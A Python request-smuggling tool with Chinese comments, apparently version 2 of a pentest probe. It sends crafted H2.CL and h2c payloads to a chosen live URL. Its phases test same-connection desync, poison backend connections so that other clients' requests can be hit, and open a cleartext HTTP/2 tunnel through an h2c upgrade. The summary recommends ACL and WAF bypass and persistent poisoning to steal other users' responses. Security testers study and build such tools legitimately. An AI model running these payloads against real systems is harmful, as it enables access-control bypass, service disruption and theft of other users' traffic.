#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H2.CL / h2c 请求走私探测 v2
================================
针对 v1 (H2CLsmuggle.py) 四个探测质量问题的重写：

问题 1  off-by-one：CL=4 但前缀 "x=1" 只有 3 字节
        → v2: 前缀长度与 CL 严格一致（make_prefix），并提供 cl=3 / cl=4
          双变体做差分，判断中间层实际消耗偏移。

问题 2  victim 与 poison 同连接，只能证明同连接 desync，无法证明跨用户毒化
        → v2: 新增独立连接毒化相位：连接 A 投递"不完整走私前缀"挂住后端，
          连接 B 发 victim，观察 B 是否挂起/收到异常响应，多轮采样。

问题 3  启发式用子串匹配（" 404 " in text），响应 body 中的数字即误报
        → v2: 按 CL / chunked / EOF 帧结构真正解析响应流，逐响应归因；
          先采集 GET 与 POST 基线签名，只认"无法归因到任何已知请求的响应"。

问题 4  收到 101 Switching Protocols 后无后续动作
        → v2: 新增 h2c 隧道相位：101 之后发送 HTTP/2 preface + SETTINGS +
          HEADERS(/探测路径)（手写 HPACK literal 编码），解析服务端帧，
          收到服务端 SETTINGS 帧即判定明文 h2 隧道可用。

用法:
    python h2cl_smuggle_v2.py https://target.example.com/
    python h2cl_smuggle_v2.py https://target/ --path /api --rounds 3 --raw

仅用于授权渗透测试 / 自有资产安全评估。
"""

import argparse
import hashlib
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

DEFAULT_TARGET = "https://example.com/"
SMUGGLED_PATH = "/smuggled-h2cl"
SMUGGLED_PATH_H2 = "/smuggled-h2c-h2"
HTTP2_SETTINGS_B64 = "AAMAAABkAAQAAP__"

TIMEOUT_CONNECT = 8.0
TIMEOUT_READ = 5.0
SLEEP_BETWEEN = 0.5

H2_FRAME_TYPES = {
    0: "DATA", 1: "HEADERS", 2: "PRIORITY", 3: "RST_STREAM", 4: "SETTINGS",
    5: "PUSH_PROMISE", 6: "PING", 7: "GOAWAY", 8: "WINDOW_UPDATE",
    9: "CONTINUATION",
}


# ----------------------------------------------------------------------
# 目标解析与连接
# ----------------------------------------------------------------------

def parse_target(user_input):
    target = user_input.strip() or DEFAULT_TARGET
    if "://" not in target:
        target = "https://" + target
    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("只支持 http 或 https URL")
    if not parsed.hostname:
        raise ValueError("无法解析 hostname")

    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    hosthdr = parsed.netloc
    if "@" in hosthdr:
        hosthdr = hosthdr.rsplit("@", 1)[1]
    if hosthdr.endswith(f":{port}") and (
        (port == 80 and parsed.scheme == "http")
        or (port == 443 and parsed.scheme == "https")
    ):
        hosthdr = hosthdr.rsplit(":", 1)[0]

    return {
        "host": host,
        "port": port,
        "sni": host,
        "hosthdr": hosthdr,
        "scheme": parsed.scheme,
        "tls": parsed.scheme == "https",
    }


class Conn:
    """TCP/TLS 裸连接封装"""

    def __init__(self, tgt):
        raw = socket.create_connection((tgt["host"], tgt["port"]), timeout=TIMEOUT_CONNECT)
        if tgt["tls"]:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw, server_hostname=tgt["sni"])
        else:
            self.sock = raw
        self.sock.settimeout(TIMEOUT_READ)

    def send(self, data):
        self.sock.sendall(data)

    def recv_all(self, timeout=None):
        if timeout is not None:
            self.sock.settimeout(timeout)
        buf = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
            except (socket.timeout, socket.error, OSError):
                break
        return buf

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# ----------------------------------------------------------------------
# HTTP/1.1 响应流解析（问题 3 的修复核心）
# ----------------------------------------------------------------------

def parse_chunked(data):
    """返回 (body, 消耗字节数, 是否完整结束)"""
    body = bytearray()
    pos = 0
    while True:
        nl = data.find(b"\r\n", pos)
        if nl == -1:
            return bytes(body), pos, False
        sz_field = data[pos:nl].split(b";", 1)[0].strip()
        try:
            size = int(sz_field, 16)
        except ValueError:
            return bytes(body), pos, False
        pos = nl + 2
        if size == 0:
            end = data.find(b"\r\n", pos)
            pos = end + 2 if end != -1 else len(data)
            return bytes(body), pos, True
        if pos + size + 2 > len(data):
            return bytes(body), pos, False
        body += data[pos:pos + size]
        pos += size + 2


def parse_http_responses(raw):
    """把一段字节流按 HTTP/1.1 帧结构切分为响应列表。
    返回 (responses, leftover)；101 之后的升级数据放入 leftover 供 h2 解析。"""
    responses = []
    buf = raw
    while buf:
        head_end = buf.find(b"\r\n\r\n")
        if head_end == -1:
            break
        lines = buf[:head_end].split(b"\r\n")
        sl = lines[0]
        if not sl.startswith(b"HTTP/"):
            break
        parts = sl.split(b" ", 2)
        try:
            status = int(parts[1])
        except (IndexError, ValueError):
            break

        headers = {}
        for line in lines[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                headers[k.strip().decode("latin-1").lower()] = v.strip().decode("latin-1")

        body_start = head_end + 4

        if status == 100:  # 中间响应，无 body，继续解析
            responses.append({"status": 100, "headers": headers, "body": b"",
                              "status_line": sl.decode("latin-1")})
            buf = buf[body_start:]
            continue

        if status in (101, 204, 304):
            responses.append({"status": status, "headers": headers, "body": b"",
                              "status_line": sl.decode("latin-1")})
            return responses, buf[body_start:]  # 101 后是升级协议字节

        if "chunked" in headers.get("transfer-encoding", "").lower():
            body, n, ok = parse_chunked(buf[body_start:])
            responses.append({"status": status, "headers": headers, "body": body,
                              "status_line": sl.decode("latin-1")})
            if not ok:
                return responses, b""
            buf = buf[body_start + n:]
        elif "content-length" in headers:
            try:
                n = int(headers["content-length"])
            except ValueError:
                n = 0
            avail = len(buf) - body_start
            body = buf[body_start:body_start + n]
            responses.append({"status": status, "headers": headers, "body": body,
                              "status_line": sl.decode("latin-1")})
            if n > avail:
                return responses, b""
            buf = buf[body_start + n:]
        else:  # 读到连接关闭
            responses.append({"status": status, "headers": headers,
                              "body": buf[body_start:],
                              "status_line": sl.decode("latin-1")})
            return responses, b""
    return responses, buf


def resp_sig(r):
    te = r["headers"].get("transfer-encoding", "").lower()
    framing = "chunked" if "chunked" in te else (
        "cl" if "content-length" in r["headers"] else "eof")
    return {
        "status": r["status"],
        "framing": framing,
        "ctype": r["headers"].get("content-type", "").split(";")[0].strip(),
        "blen": len(r["body"]),
        "bhash": hashlib.md5(r["body"][:256]).hexdigest()[:8],
        "server": r["headers"].get("server", ""),
    }


def sig_match(a, b, tol=24):
    """基线签名宽松比对：状态+分帧+类型必须一致，body 长度允许动态内容波动"""
    if not a or not b:
        return False
    if not (a["status"] == b["status"] and a["framing"] == b["framing"]
            and a["ctype"] == b["ctype"]):
        return False
    if a["blen"] == b["blen"]:
        return True
    big = max(a["blen"], b["blen"])
    return abs(a["blen"] - b["blen"]) <= max(tol, int(0.15 * big))


# ----------------------------------------------------------------------
# 报文构造（问题 1 的修复核心：前缀与 CL 严格对齐）
# ----------------------------------------------------------------------

def make_prefix(cl):
    """生成恰好 cl 字节的表单前缀，与 Content-Length 严格一致"""
    return ("x=1" + "&" * 16)[:cl]


def build_poison(hosthdr, base_path, upgrade=True, cl=3, hold=False):
    """走私探测报文。
    hold=True 时走私请求不带终止空行，用于挂住后端等待更多字节（跨连接毒化用）"""
    prefix = make_prefix(cl)
    tail = "" if hold else "\r\n"
    smuggled = f"GET {SMUGGLED_PATH} HTTP/1.1\r\nHost: {hosthdr}\r\n{tail}"

    lines = [
        f"POST {base_path} HTTP/1.1",
        f"Host: {hosthdr}",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {cl}",
    ]
    if upgrade:
        lines += [
            "Upgrade: h2c",
            f"HTTP2-Settings: {HTTP2_SETTINGS_B64}",
            "Connection: Upgrade, HTTP2-Settings",
        ]
    else:
        lines += ["Connection: keep-alive"]
    return ("\r\n".join(lines) + "\r\n\r\n" + prefix + smuggled).encode("iso-8859-1")


def build_victim(hosthdr, base_path, close=True):
    c = "close" if close else "keep-alive"
    return (f"GET {base_path} HTTP/1.1\r\nHost: {hosthdr}\r\n"
            f"Connection: {c}\r\n\r\n").encode("iso-8859-1")


def build_normal_post(hosthdr, base_path):
    return (f"POST {base_path} HTTP/1.1\r\nHost: {hosthdr}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\nConnection: close\r\n\r\nx=1").encode("iso-8859-1")


# ----------------------------------------------------------------------
# HTTP/2 最小实现（问题 4 的修复核心）
# ----------------------------------------------------------------------

def h2_frame(ftype, flags, sid, payload=b""):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + (sid & 0x7FFFFFFF).to_bytes(4, "big") + payload)


def hpack_lit(name, value):
    """literal header field without indexing -- new name，无 Huffman"""
    n = name.encode()
    v = value.encode()
    return b"\x00" + bytes([len(n)]) + n + bytes([len(v)]) + v


def build_h2_get(authority, path, scheme):
    block = (hpack_lit(":method", "GET") + hpack_lit(":scheme", scheme)
             + hpack_lit(":authority", authority) + hpack_lit(":path", path))
    return (b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            + h2_frame(4, 0, 0)          # 客户端 SETTINGS（空）
            + h2_frame(1, 0x5, 1, block))  # HEADERS: END_STREAM|END_HEADERS


def parse_h2_frames(data):
    out = []
    pos = 0
    while len(data) - pos >= 9:
        ln = int.from_bytes(data[pos:pos + 3], "big")
        if len(data) - pos - 9 < ln:
            break
        out.append({
            "type": data[pos + 3],
            "flags": data[pos + 4],
            "sid": int.from_bytes(data[pos + 5:pos + 9], "big") & 0x7FFFFFFF,
            "len": ln,
        })
        pos += 9 + ln
    return out


# ----------------------------------------------------------------------
# 输出辅助
# ----------------------------------------------------------------------

SEP = "=" * 64


def hdr(title):
    print(f"\n{SEP}\n- {title}\n{SEP}")


def fmt_resp(r, idx):
    try:
        snippet = r["body"][:72].decode("utf-8")
    except UnicodeDecodeError:
        snippet = r["body"][:72].decode("latin-1", errors="replace")
    body = snippet.replace("\r", " ").replace("\n", " ")
    te = r["headers"].get("transfer-encoding", "")
    cl = r["headers"].get("content-length", "")
    framing = f"chunked" if te else (f"cl={cl}" if cl else "eof")
    return (f"  #{idx} {r['status_line']}  [{framing} body={len(r['body'])}B]\n"
            f"      body~ {body}")


def dump_raw(tag, data):
    print(f"  [{tag} 原始 {len(data)}B]")
    print("  " + data.decode("latin-1", errors="replace")
          .replace("\r\n", "\n").replace("\n", "\n  "))


# ----------------------------------------------------------------------
# Phase 0: 基线采集
# ----------------------------------------------------------------------

def phase_baseline(tgt):
    hdr("Phase 0  基线采集 (GET / POST 正常签名)")
    get_sig = post_sig = None

    c = Conn(tgt)
    try:
        c.send(build_victim(tgt["hosthdr"], tgt["path"], close=True))
        resp, _ = parse_http_responses(c.recv_all())
        if resp:
            get_sig = resp_sig(resp[0])
            print(fmt_resp(resp[0], 1) + "   <-- GET 基线")
        else:
            print("  [!] GET 基线无响应")
    finally:
        c.close()

    c = Conn(tgt)
    try:
        c.send(build_normal_post(tgt["hosthdr"], tgt["path"]))
        resp, _ = parse_http_responses(c.recv_all())
        if resp:
            post_sig = resp_sig(resp[0])
            print(fmt_resp(resp[0], 1) + "   <-- POST 基线")
        else:
            print("  [!] POST 基线无响应")
    finally:
        c.close()

    return get_sig, post_sig


# ----------------------------------------------------------------------
# Phase 1: 同连接 desync（多变体差分）
# ----------------------------------------------------------------------

def classify_same_conn(responses, get_sig, post_sig):
    n = len(responses)
    info = {
        "verdict": "UNKNOWN",
        "detail": "",
        "upgrade_101": any(r["status"] == 101 for r in responses),
        "unattributed": [],
    }
    if n == 0:
        info["verdict"] = "NO_RESPONSE"
        info["detail"] = "无响应/连接被挂起"
        return info

    r1_ok = post_sig and sig_match(resp_sig(responses[0]), post_sig)

    if n == 1:
        info["verdict"] = "VICTIM_MISSING"
        info["detail"] = "仅收到 poison 响应，victim 无响应（后端可能在等待 body 字节）"
    elif n == 2:
        r2_ok = get_sig and sig_match(resp_sig(responses[1]), get_sig)
        if r1_ok and r2_ok:
            info["verdict"] = "CLEAN"
            info["detail"] = "两个响应均可归因，边界一致"
        elif r2_ok:
            info["verdict"] = "POST_DIFFERS"
            info["detail"] = "poison 的 POST 响应与基线不同（可能被前端改写/拦截），GET 正常"
        else:
            info["verdict"] = "BOUNDARY_SHIFT"
            info["detail"] = "victim 位置收到非基线响应：响应队列错位（desync 强信号）"
            info["unattributed"].append({"idx": 2, "sig": resp_sig(responses[1])})
    else:
        info["verdict"] = "SAME_CONN_SMUGGLING"
        info["detail"] = f"响应数 {n} > 客户端可见请求数 2：CL 之外字节被当作独立请求"
        for i, r in enumerate(responses):
            s = resp_sig(r)
            known = (i == 0 and post_sig and sig_match(s, post_sig)) or \
                    (i == n - 1 and get_sig and sig_match(s, get_sig))
            if not known:
                info["unattributed"].append({"idx": i + 1, "sig": s,
                                             "status_line": r["status_line"]})
    return info


def phase_same_conn(tgt, variant, get_sig, post_sig, sleep_between, raw_out):
    hdr(f"Phase 1  同连接探测  变体: {variant['name']}")
    poison = build_poison(tgt["hosthdr"], tgt["path"],
                          upgrade=variant["upgrade"], cl=variant["cl"], hold=False)
    victim = build_victim(tgt["hosthdr"], tgt["path"], close=True)
    print("  Poison 首行: " + poison.split(b"\r\n")[0].decode("latin-1")
          + f"  (CL={variant['cl']}, 前缀={make_prefix(variant['cl'])!r}, "
            f"upgrade={variant['upgrade']})")

    c = Conn(tgt)
    try:
        c.send(poison)
        time.sleep(sleep_between)
        c.send(victim)
        raw = c.recv_all()
    finally:
        c.close()

    responses, leftover = parse_http_responses(raw)
    print(f"  解析出 {len(responses)} 个响应:")
    for i, r in enumerate(responses):
        print(fmt_resp(r, i + 1))
    if leftover:
        print(f"  [i] 未解析尾部字节 {len(leftover)}B（可能为升级协议数据/半截响应）")
    if raw_out:
        dump_raw("响应", raw)

    info = classify_same_conn(responses, get_sig, post_sig)
    print(f"  ==> 判定: {info['verdict']}")
    print(f"      {info['detail']}")
    if info["unattributed"]:
        for u in info["unattributed"]:
            print(f"      无法归因响应: #{u['idx']} "
                  f"{u.get('status_line', '')} sig={u['sig']}")
    if info["upgrade_101"]:
        print("      [!] 前端接受了 h2c Upgrade（101）")
    return info


# ----------------------------------------------------------------------
# Phase 2: 跨连接毒化（问题 2 的修复核心）
# ----------------------------------------------------------------------

def phase_cross_conn(tgt, variant, get_sig, post_sig, rounds, sleep_between, raw_out):
    hdr(f"Phase 2  跨连接毒化  基于变体: {variant['name']}  轮数: {rounds}")
    print("  流程: A 连接投递不完整走私前缀(hold) -> B 连接发 victim -> 释放 A 并观察")

    rounds_res = []
    for i in range(rounds):
        a = b = None
        try:
            a = Conn(tgt)
            a.send(build_poison(tgt["hosthdr"], tgt["path"],
                                upgrade=variant["upgrade"], cl=variant["cl"], hold=True))
            time.sleep(sleep_between)

            b = Conn(tgt)
            t0 = time.time()
            b.send(build_victim(tgt["hosthdr"], tgt["path"], close=True))
            rb = b.recv_all(timeout=3.0)
            latency = time.time() - t0

            ra_before = a.recv_all(timeout=2.0)
            try:
                a.send(b"\r\n\r\n")  # 补空行释放被挂住的走私请求
            except OSError:
                pass
            ra_after = a.recv_all(timeout=2.0)
        except (socket.error, OSError, ssl.SSLError) as e:
            print(f"  第 {i + 1} 轮连接异常: {e}")
            continue
        finally:
            if a:
                a.close()
            if b:
                b.close()

        resp_b, _ = parse_http_responses(rb)
        resp_a, _ = parse_http_responses(ra_before + ra_after)

        if not resp_b:
            vb = {"verdict": "VICTIM_TIMEOUT", "detail": f"victim {latency:.1f}s 无响应"}
        elif get_sig and sig_match(resp_sig(resp_b[0]), get_sig):
            vb = {"verdict": "VICTIM_NORMAL", "detail": "victim 响应与 GET 基线一致"}
        else:
            vb = {"verdict": "VICTIM_MISMATCH",
                  "detail": f"victim 响应异常: {resp_b[0]['status_line']}"}

        a_extra = []
        for j, r in enumerate(resp_a):
            if not (post_sig and sig_match(resp_sig(r), post_sig)):
                a_extra.append(r["status_line"])

        rounds_res.append({"b": vb, "a_extra": a_extra})
        print(f"  第 {i + 1} 轮: B={vb['verdict']} ({vb['detail']})  "
              f"A共{len(resp_a)}响应(额外: {a_extra if a_extra else '无'})")
        if raw_out:
            dump_raw("B 响应", rb)
            dump_raw("A 响应", ra_before + ra_after)

    print(f"\n  ==> 判定: ", end="")
    if any(r["b"]["verdict"] == "VICTIM_TIMEOUT" and r["a_extra"] for r in rounds_res):
        verdict = ("CROSS_CONN_SUSPECT: victim 挂起的同时毒化连接收到额外响应，"
                   "后端连接可能被跨连接复用/污染")
    elif any(r["b"]["verdict"] == "VICTIM_MISMATCH" for r in rounds_res):
        verdict = ("CROSS_CONN_ANOMALY: victim 收到与基线不符的响应，"
                   "需人工确认是否为响应队列错位")
    elif not rounds_res:
        verdict = "CROSS_CONN_ERROR: 全部轮次连接失败"
    else:
        verdict = ("NO_CROSS_CONN_EVIDENCE: 未观察到跨连接影响"
                   "（注意：后端连接池复用是概率性的，阴性不等于安全）")
    print(verdict)
    return {"verdict": verdict, "rounds": rounds_res}


# ----------------------------------------------------------------------
# Phase 3: h2c 隧道验证（问题 4 的修复核心）
# ----------------------------------------------------------------------

def phase_h2c_tunnel(tgt, raw_out):
    hdr("Phase 3  h2c 隧道验证 (GET + Upgrade: h2c -> 101 -> HTTP/2 帧)")
    req = (f"GET {tgt['path']} HTTP/1.1\r\nHost: {tgt['hosthdr']}\r\n"
           f"Upgrade: h2c\r\nHTTP2-Settings: {HTTP2_SETTINGS_B64}\r\n"
           f"Connection: Upgrade, HTTP2-Settings\r\n\r\n").encode("iso-8859-1")

    c = Conn(tgt)
    try:
        c.send(req)
        first = c.recv_all(timeout=3.0)
    except (socket.error, OSError, ssl.SSLError) as e:
        print(f"  [ERROR] {e}")
        c.close()
        return {"verdict": "CONN_ERROR"}

    resp, leftover = parse_http_responses(first)
    for i, r in enumerate(resp):
        print(fmt_resp(r, i + 1))
    if raw_out:
        dump_raw("第一阶段响应", first)

    if not any(r["status"] == 101 for r in resp):
        c.close()
        print("  ==> 判定: NO_101: 前端未接受 h2 升级，明文隧道不成立")
        return {"verdict": "NO_101"}

    print("  [!] 收到 101，发送 HTTP/2 preface + SETTINGS + HEADERS "
          f"({SMUGGLED_PATH_H2})")
    scheme = "https" if tgt["tls"] else "http"
    try:
        c.send(build_h2_get(tgt["hosthdr"], SMUGGLED_PATH_H2, scheme))
        data2 = c.recv_all(timeout=3.0)
    except (socket.error, OSError, ssl.SSLError) as e:
        print(f"  [ERROR] 升级后发送失败: {e}")
        c.close()
        return {"verdict": "H2_SEND_ERROR"}
    finally:
        try:
            c.close()
        except OSError:
            pass

    frames = parse_h2_frames(leftover + data2)
    print(f"  收到 {len(frames)} 个 HTTP/2 帧:")
    for f in frames[:10]:
        print(f"    {H2_FRAME_TYPES.get(f['type'], f'?'):13s} sid={f['sid']} "
              f"len={f['len']} flags=0x{f['flags']:02x}")

    if any(f["type"] == 4 for f in frames):
        verdict = "H2C_TUNNEL_CONFIRMED: 服务端以 HTTP/2 SETTINGS 帧应答，明文 h2 隧道可用（高危）"
    elif any(f["type"] == 7 for f in frames):
        verdict = "H2_GOAWAY: 升级后立即被 GOAWAY 拒绝"
    else:
        verdict = "101_BUT_NO_H2: 101 之后无有效 HTTP/2 帧"
    print(f"  ==> 判定: {verdict}")
    return {"verdict": verdict, "frames": frames}


# ----------------------------------------------------------------------
# 汇总
# ----------------------------------------------------------------------

def summarize(same_results, cross_result, tunnel_result):
    hdr("汇总")
    desync, only_upgrade, plain_hit = [], [], False
    for name, info in same_results.items():
        v = info["verdict"]
        if v in ("SAME_CONN_SMUGGLING", "BOUNDARY_SHIFT", "VICTIM_MISSING"):
            desync.append(name)
            if not name.startswith("h2c"):
                plain_hit = True

    if desync:
        if plain_hit:
            print(f"  [!!] 通用 CL desync（与升级头无关）: {', '.join(desync)}")
            print("       影响面最大：任意客户端均可触发，建议优先修复")
        else:
            print(f" [!] 升级头诱导的解析分歧: {', '.join(desync)}")
            print("      仅 Upgrade/Connection 头存在时触发：前端升级语义处理不当")
    else:
        print("  [ok] 所有同连接变体均未观察到 desync")

    print(f"  跨连接: {cross_result['verdict']}")
    print(f"  h2c 隧道: {tunnel_result['verdict']}")

    print("\n  建议后续动作:")
    if desync:
        print("   1) 偏移探测：走私目标改用 /，构造 GET/ET/T 不同起始的错位残请求，")
        print("      依响应形态(200 ok=对齐 / chunked402=method异常但路径/ / 裸404=路径非/)推断消耗偏移")
        print("   2) 用已确认的变体尝试访问前端封锁、后端可达的路径验证 ACL/WAF 绕过")
    cv = cross_result["verdict"]
    if "CROSS_CONN_SUSPECT" in cv or "CROSS_CONN_ANOMALY" in cv:
        print("   3) 跨连接异常已出现：尝试构造持久毒化（队列前缀），评估跨用户响应窃取")
    if tunnel_result["verdict"] == "H2C_TUNNEL_CONFIRMED":
        print("   4) h2c 隧道可用：可切换 h2csmuggler 建立完整隧道绕过前端访问控制")


# ----------------------------------------------------------------------
# main
# ----------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="H2.CL / h2c 请求走私探测 v2（对齐修复 + 差分变体 + 跨连接 + h2 帧）")
    ap.add_argument("target", nargs="?", default=DEFAULT_TARGET, help="目标 URL")
    ap.add_argument("--path", default="/", help="基准路径 (默认 /)")
    ap.add_argument("--rounds", type=int, default=2, help="跨连接毒化轮数 (默认 2)")
    ap.add_argument("--sleep", type=float, default=SLEEP_BETWEEN, help="poison/victim 间隔秒")
    ap.add_argument("--skip-cross", action="store_true", help="跳过跨连接相位")
    ap.add_argument("--skip-tunnel", action="store_true", help="跳过 h2c 隧道相位")
    ap.add_argument("--raw", action="store_true", help="输出原始字节流")
    args = ap.parse_args()

    print("=== H2.CL / h2c HTTP Request Smuggling 探测工具 v2 ===")
    try:
        tgt = parse_target(args.target)
    except ValueError as e:
        print(f"[!] 输入错误: {e}")
        sys.exit(1)
    tgt["path"] = args.path or "/"
    print(f"[*] 目标: {tgt['host']}:{tgt['port']}  TLS: {tgt['tls']}  "
          f"路径: {tgt['path']}  Host: {tgt['hosthdr']}")

    get_sig, post_sig = phase_baseline(tgt)

    variants = [
        {"name": "h2c-cl3(前缀x=1)", "upgrade": True, "cl": 3},
        {"name": "h2c-cl4(前缀x=1&)", "upgrade": True, "cl": 4},
        {"name": "plain-cl3(无升级头)", "upgrade": False, "cl": 3},
        {"name": "plain-cl4(无升级头)", "upgrade": False, "cl": 4},
    ]
    same_results = {}
    for v in variants:
        try:
            same_results[v["name"]] = phase_same_conn(
                tgt, v, get_sig, post_sig, args.sleep, args.raw)
        except (socket.error, OSError, ssl.SSLError) as e:
            print(f"  [ERROR] 变体 {v['name']} 连接失败: {e}")
            same_results[v["name"]] = {"verdict": "CONN_ERROR", "detail": str(e),
                                       "upgrade_101": False, "unattributed": []}

    cross_result = {"verdict": "SKIPPED", "rounds": []}
    if not args.skip_cross:
        desync_variant = next(
            (v for v in variants
             if same_results[v["name"]]["verdict"] in
             ("SAME_CONN_SMUGGLING", "BOUNDARY_SHIFT", "VICTIM_MISSING")),
            variants[0])
        try:
            cross_result = phase_cross_conn(
                tgt, desync_variant, get_sig, post_sig,
                args.rounds, args.sleep, args.raw)
        except (socket.error, OSError, ssl.SSLError) as e:
            cross_result = {"verdict": f"CROSS_CONN_ERROR: {e}", "rounds": []}

    tunnel_result = {"verdict": "SKIPPED"}
    if not args.skip_tunnel:
        try:
            tunnel_result = phase_h2c_tunnel(tgt, args.raw)
        except (socket.error, OSError, ssl.SSLError) as e:
            tunnel_result = {"verdict": f"TUNNEL_ERROR: {e}"}

    summarize(same_results, cross_result, tunnel_result)
    print(f"\n{SEP}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
